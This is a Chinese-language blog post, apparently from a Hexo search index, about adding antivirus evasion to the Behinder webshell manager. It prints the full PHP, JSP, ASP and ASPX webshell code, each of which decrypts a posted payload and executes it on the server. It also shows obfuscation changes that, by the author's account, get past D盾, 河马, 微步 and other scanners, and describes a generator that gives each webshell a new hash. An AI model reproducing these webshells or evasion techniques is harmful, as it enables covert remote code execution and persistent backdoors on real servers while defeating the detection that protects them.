<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>冰蝎二开从0到1-2(免杀)</title>
      <link href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/"/>
      <url>/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴提议说，我们上个文章改了一下冰蝎的流量，但是在实际的应用中，我们打战肯定要先传木马落地，如果不能落地，那么你流量改的再好，其实也没有意义，想想，确实也是。没有第一步上传文件，哪里存在流量呢。</p><p>那么这次咱们来做一下免杀。在实际的应用中，似乎我们经常碰到安全设备，奈何咱这也没有啥安全设备，我们就采用常见的厂商的在线杀软吧。如果有小伙伴有的话，可以帮我测测，把结果告诉我，笔者再进行优化。</p><h5 id="ui编写"><a href="#ui编写" class="headerlink" title="ui编写"></a>ui编写</h5><p>在godzilla中，作者已经给我们写好了生成脚本的按钮，只需要自己去生成就好了，但是冰蝎是不自带的，冰蝎的木马是在我们下载的时候，放在同目录里面的，直接拿去用就好了。但似乎不太适合我们，为什么呢，因为就算我们将免杀后的木马放到目录下，他只能是一个文件，就是不能动态的生成了，一个免杀文件很容易被厂商标记，所以我们还是想办法去每次生成的都不太一样。</p><p>net/rebeyond/behinder/ui/controller是冰蝎界面的目录，里面有很多文件，包含各种controller<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706025725077-17517418458692.png" alt="image-20250706025725077"></p><p>其中java的肯定都是各种功能文件了，fxml是ui界面了，冰蝎的ui界面使用的是JavaFX。</p><p><strong>JavaFX</strong> 是 Java 平台的一个图形用户界面（GUI）工具包，用于创建<strong>富客户端应用（Rich Client Application）</strong>。它是 Java 的官方 GUI 库之一，是 Swing 的现代替代方案，支持硬件加速、样式化（CSS）、动画、多媒体等功能。</p><p>简单看一个main.fxml</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030023010.png" alt="image-20250706030023010"></p><p>可以看到一些TableColumn，也就是这里，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030109566-17517420700973.png" alt="image-20250706030109566"></p><p>需要改什么的话，改这里就可以了。</p><p>这里不在讲解javafx的语法了，不是本文的重点，是在不会写，可以用scene builder去界面话编程，安装后<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030455421.png" alt="image-20250706030455421"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030515440.png" alt="image-20250706030515440"></p><p>就可以使用了，直接拖动即可。</p><p>接下来开始写，在net/rebeyond/behinder/ui/Main.fxml，先加个按钮，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030708263.png" alt="image-20250706030708263"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030716807.png" alt="image-20250706030716807"></p><p>然后给到功能点，本来笔者想着直接在main.fxml里面直接写，但是把他的功能点net.rebeyond.behinder.ui.controller.MainController，copy一份后，总实报错，后面也没解决掉，索性直接从新定义一个Controller，写自己的功能。我们也从新定义一个免杀生成的界面，就是点击按钮后的界面，miansha.fxml</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080335741.png" alt="image-20250706080335741"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080719677.png" alt="image-20250706080719677"></p><p>它的Controller，也是自己定义的，一会在里面写功能点。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080437654.png" alt="image-20250706080437654"></p><p>因为刚刚我们提到MainController不能重新写，老是报错，我们就将免杀的按钮绑定到main.java，然后读取miansha.fxml，也是一样的。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080647669.png" alt="image-20250706080647669"></p><p>这样，整个框架就完成了，后面就是补一下每个生成免杀的功能点了。</p><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>， <span class="string">&quot;AES128&quot;</span>， <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>，<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C()，<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先看原版的server端木马，定义了key，<code>$post=file_get_contents(&quot;php://input&quot;);</code>获取所有输入内容，这也就是我们上篇文章看到的冰蝎的流量是不需要传参的，拿到post的数据后，两种方式，如果没有openssl，就用post异或key，如果有openssl，那么就aes解发来的数据，然后用<code>|</code>区分eval和assert也就是区分php5和php7去执行命令</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250708142341950.png" alt="image-20250708142341950"></p><p>后面就好理解了，用__invoke()方法，当你像调用函数一样“调用一个对象”时，PHP 会自动执行这个对象的 <code>__invoke()</code> 方法；</p><p><code>class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</code>定义了一个类，<code>@call_user_func(new C()，$params);</code>调用这个类，此时$params=$p，然后执行上面图片中看到的eval。</p><p>好，了解完木马，我们就可以写免杀了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231438699.png" alt="image-20250709231438699"></p><p>源码肯定报毒，我们先来fuzz一下，</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231528436.png" alt="image-20250709231528436"></p><p>去掉一半，报</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231610013.png" alt="image-20250709231610013"></p><p>这个地方我们可以先base64 在解回来。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232118501.png" alt="image-20250709232118501"></p><p>这里再把file_get_contents给拆除去，既可以了，当然也可以base64一下</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232220803.png" alt="image-20250709232220803"></p><p>此时就报eval了，我们再去解决eval的问题。<br>这里我们可以使用godzilla那种写法，就可以了</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235845934.png" alt="image-20250709235845934"></p><p>大家会看到，下面的魔术函数没了，其实不用，反正都是加载eval，有一个就可以了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232552802.png" alt="image-20250709232552802"></p><p>报可疑文件，这里不知道哪里报了，我们接着fuzz<br>经过guzz发现是在xor那里，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232744325-17520748650231.png" alt="image-20250709232744325"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$post</span>=<span class="variable">$sddd</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这好办，我们改改变量，改改数字即可，写到函数里就可以了。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709234009451.png" alt="image-20250709234009451"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709234028560.png" alt="image-20250709234028560"></p><p>河马本地版，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235052885.png" alt="image-20250709235052885"></p><p>网页版有问题，我们也fuzz一下，</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235150875.png" alt="image-20250709235150875"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235833348.png" alt="image-20250709235833348">我们这里直接把eval拿掉，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235652766.png" alt="image-20250709235652766"></p><p>就可以了，啊这，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710000036036.png" alt="image-20250710000036036"></p><p>这里直接把所有的都删掉，就剩eval，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710000109872.png" alt="image-20250710000109872"></p><p>也还是不行，那这样的话，暂时就解决不掉了。<br>微步<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710005546630.png" alt="image-20250710005546630"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710005557304.png" alt="image-20250710005557304"></p><p>火绒，360</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710010235877.png" alt="image-20250710010235877"></p><p>其他就不在测试了，大家要是有啥商业的可疑帮我测测，提issue。好开始封装到里面，这次我们依然用动态的，保证每次生成的木马hash都不一样。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710010649587.png" alt="image-20250710010649587"></p><p>先给定一个模板，然后将变量替换掉，花一点时间，写一下<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710012845890.png" alt="image-20250710012845890"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022245696.png" alt="image-20250710022245696"></p><p>ok，打包，编译<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022415478.png" alt="image-20250710022415478"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022447466.png" alt="image-20250710022447466"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022434216.png" alt="image-20250710022434216"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710024629907.png" alt="image-20250710024629907"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022526908.png" alt="image-20250710022526908"></p><p>没有问题，正常使用。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710024401997.png" alt="image-20250710024401997"></p><p>好的，php我们就先到这里，接下来jsp。</p><h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>老样子，先来学习一下jsp的木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*，javax.crypto.*，javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b，<span class="number">0</span>，b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>，k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>，<span class="keyword">new</span> SecretKeySpec(k.getBytes()，<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>木马很短，核心就是payload 解密 base64， 在解密aes 在动态类加载</p><p>这里面经过笔者测试，&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b，0，b.length);}}%&gt;，容易被杀，session.putValue(“u”，k);Cipher c=Cipher.getInstance(“AES”);c.init(2，new SecretKeySpec(k.getBytes()，”AES”));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer也容易被杀，我们一点一点来，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713192137570.png" alt="image-20250713192137570"></p><p>原版的木马肯定报毒，我们fuzz一下，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713194553717-17524071539801.png" alt="image-20250713194553717"></p><p>直接给aes及功能去掉，不报，那就是，主要看下面这部分。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713194620941.png" alt="image-20250713194620941"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if (request.getMethod().equals(&quot;PO&quot;+&quot;ST&quot;))&#123;String ssss=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">session.putValue(&quot;u&quot;，ssss);</span><br><span class="line">Cipher c=Cipher.getInstance(&quot;A&quot;+&quot;E&quot;+&quot;S&quot;);</span><br><span class="line">c.init(2，new SecretKeySpec(k.getBytes()，&quot;A&quot;+&quot;E&quot;+&quot;S&quot;));</span><br><span class="line">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(request，response，seesion);&#125;%&gt;</span><br></pre></td></tr></table></figure><p>去除new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(request，response，seesion);，就要报可疑<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713201843980.png" alt="image-20250713201843980"></p><p>那么首先我们给他拆开，这一句太长了。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713203851218.png" alt="image-20250713203851218"></p><p>花一点点时间拆开了<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713203923359.png" alt="image-20250713203923359"></p><p>就报了可疑，那么还是需要fuzz一下，看看那一句话不行。经过测试发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">c.init(2， new SecretKeySpec(ssss.getBytes()， &quot;AES&quot;));</span><br><span class="line"></span><br><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">XxYzLoader u = new XxYzLoader(cl);</span><br></pre></td></tr></table></figure><p>经过笔者测试，这两句都有问题，一句是加载aes，一句是动态加载类，我们在上次的哥斯拉二开中，其实已经发现了，d盾会拦截getClassLoader这种类似的单词，所以这里我们还是用<code>getSystemClassLoader</code><br><code> ClassLoader cl = ClassLoader.getSystemClassLoader();  XxYzLoader u = new XxYzLoader(cl);</code></p><p>上次的哥斯拉免杀aes加密也是拦截，也就是SecretKeySpec，哥斯拉用的是反射类加载绕过的，这里我们使用匿名类，大部分 AES 用法都需要 <code>SecretKeySpec</code>，但我们可以用一个匿名类直接实现 <code>SecretKey</code>，只要它返回的内容符合要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SecretKey key = <span class="keyword">new</span> javax.crypto.SecretKey() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAlgorithm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFormat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RAW&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getEncoded() &#123;</span><br><span class="line">        <span class="keyword">return</span> ssss.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是这样，这样也就绕过了SecretKeySpec。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713212725771-17524132460002.png" alt="image-20250713212725771"></p><p>这样我们改完，也就没有问题了，免杀d盾了。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713212823506.png" alt="image-20250713212823506"></p><p>在线版河马也没有问题，上次我们的godzilla，jsp就没有过去，因为当时使用的是反射类加载，他会报反射类加载，这次并没有使用。<br>微步<br>也没啥问题。<br>火绒360<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713213830826.png" alt="image-20250713213830826"></p><p>ok，其他的就不在测试了，我们封装到冰蝎中，改改名，让他动起来。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713221823114.png" alt="image-20250713221823114"></p><p>花一点点时间把模板写好，老样子，进行随机字符选取并且生成。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713223354412.png" alt="image-20250713223354412"></p><p>这里如果你在生成木马的时候，没有写木马，默认为<code>bohemian</code>。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713224407939.png" alt="image-20250713224407939"></p><p>生成三分，都不一样，ok。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713224443321.png" alt="image-20250713224443321"></p><p>功能也都正常。再把404加上。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714001925736.png" alt="image-20250714001925736"><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714001952066.png" alt="image-20250714001952066">ok。jsp就先到这里。下面免杀asp。</p><h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>我们先来看下asp的木马，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Response.CharSet = &quot;UTF-8&quot; </span><br><span class="line">k=&quot;e45e329feb5d925b&quot; &#x27;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="line">Session(&quot;k&quot;)=k</span><br><span class="line">size=Request.TotalBytes</span><br><span class="line">content=Request.BinaryRead(size)</span><br><span class="line">For i=1 To size</span><br><span class="line">result=result&amp;Chr(ascb(midb(content，i，1)) Xor Asc(Mid(k，(i and 15)+1，1)))</span><br><span class="line">Next</span><br><span class="line">execute(result)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>可以看到，很短，在asp中，加密就不在用aes了，而是用了xor，可能是调用aes不好调用了。我们来看下怎么免杀。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714010004614.png" alt="image-20250714010004614"></p><p>原版肯定被杀，这里xor需要改一下，还有就是execute需要改一下。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720101659191.png" alt="image-20250720101659191"></p><p>经过笔者测试，result=result&amp;Chr(ascb(midb(content，i，1)) Xor Asc(Mid(k，(i and 15)+1，1)))这一句从新写一下就可过掉d盾。看看河马<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720101920447.png" alt="image-20250720101920447"></p><p>河马本地的也是没有问题。在线的也没有问题。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720102029758.png" alt="image-20250720102029758"></p><p>微步，也没啥问题，最近测试好像老是未知。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720105901614.png" alt="image-20250720105901614"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720105919523.png" alt="image-20250720105919523"></p><p>我们花一点点时间封装一下，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110010668.png" alt="image-20250720110010668"></p><p>整个模板，套一下，即可。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110101718.png" alt="image-20250720110101718"></p><p>欧克。大家在使用的时候，如果传上去是500，不要慌，直接连接即可。正常使用。这个报错是没加try.不影响使用，因为没传递参数嘛.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110256177.png" alt="image-20250720110256177"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110442638.png" alt="image-20250720110442638"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110525367.png" alt="image-20250720110525367"></p><p>同时也可以看到，加了状态码。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110555691.png" alt="image-20250720110555691"></p><p>大家也可以看到这个asp的请求包和回显包都是乱码，这就是马中xor起的作用，有不可显字符嘛。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720111519445.png" alt="image-20250720111519445"></p><p>好的，asp先到这里，接下看aspx</p><h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>还是先来看下aspx的源码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;，&quot;e45e329feb5d925b&quot;); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;)，c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k， k).TransformFinalBlock(c， 0， c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure><p>也是很短。RijndaelManaged()  这里是创建aes加密，用获取到的key。那么我们就重点对这里做免杀。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720112953875.png" alt="image-20250720112953875"></p><p>先简单拆一下，可以看到单文件aspx，我们fuzz一下，看看哪里有问题，还是以前提到的，RijndaelManaged 换成AesManaged，这个加密函数替换一下，就可以了。<br>这里笔者在fuzz的时候发现是Assembly.Load，他是用来插件系统加载用户扩展 DLL，简单的来说就是加载内存的，似乎并没有什么其他的能替换掉，可以拆开，像下面这样反射加载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string asmClass = &quot;System.&quot; + &quot;Reflection.&quot; + &quot;Assembly&quot;;</span><br><span class="line">string loadMethod = &quot;Lo&quot; + &quot;ad&quot;;</span><br><span class="line">var asmType = Type.GetType(asmClass);</span><br><span class="line">var asm = asmType.GetMethod(loadMethod， new Type[] &#123; typeof(byte[]) &#125;).Invoke(null， new object[] &#123; ccccc &#125;);</span><br><span class="line">((Assembly)asm).CreateInstance(&quot;U&quot;).Equals(this);</span><br></pre></td></tr></table></figure><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720143532447.png" alt="image-20250720143532447"></p><p>这样就把可以文件去掉了。<br>剩下这个单文件aspx了，这个我们在以前godzilla中，已经说到了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720144344297.png" alt="image-20250720144344297"></p><p>就是头部有这种<code>&lt;%@ Page Language=&quot;C#&quot; %&gt;``&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>，这里处理是将&lt;%@ Page Language=”C#” %&gt;放到后面，也就是文件底部，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720144512576-17529939129321.png" alt="image-20250720144512576"></p><p>那么其实还是会报单文件，这里就是还存在<code>&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>，我只需将这个引入命名空间System.Reflection直接写到利用的地方即可，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145634926.png" alt="image-20250720145634926"></p><p>这样就不用在上面定义了。也就可以过d盾了。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145702160.png" alt="image-20250720145702160"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145816947.png" alt="image-20250720145816947">本地河马没问题。在线河马也没问题<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145947400.png" alt="image-20250720145947400"></p><p>微步，只能说微步的gpt说的很对，当然给到gpt，我感觉都能分析出吧.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150239785.png" alt="image-20250720150239785"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150329609.png" alt="image-20250720150329609"></p><p>阿里云，aspx的我惊奇的发现，过掉了阿里云，在Godzilla中是没有过掉的，应该是吧字符串都拆开的原因.<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150558999.png" alt="image-20250720150558999"></p><p>好，这样免杀就做完了，360和火绒就不看了，没啥意思.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720151459044.png" alt="image-20250720151459044"></p><p>花一点点时间，封装一下，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155335012.png" alt="image-20250720155335012"></p><p>好了，生成木马时记得写密码，不写的话就是bohemian。</p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155618614-17529981803701.png" alt="image-20250720155618614"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155652802.png" alt="image-20250720155652802"></p><p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155723593.png" alt="image-20250720155723593"></p><p>使用起来也是没有任何问题。这样aspx的也就完成了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在界面添加了免杀生成的按钮，这样在找马的时候就不会手忙脚乱的了，直接生成即可。这里也算进行了简单的免杀，全部语言除了 aliyun没有过去，其他的平台基本全过，aspx的阿里云过去了。不得不承认，aliyun是强的。php 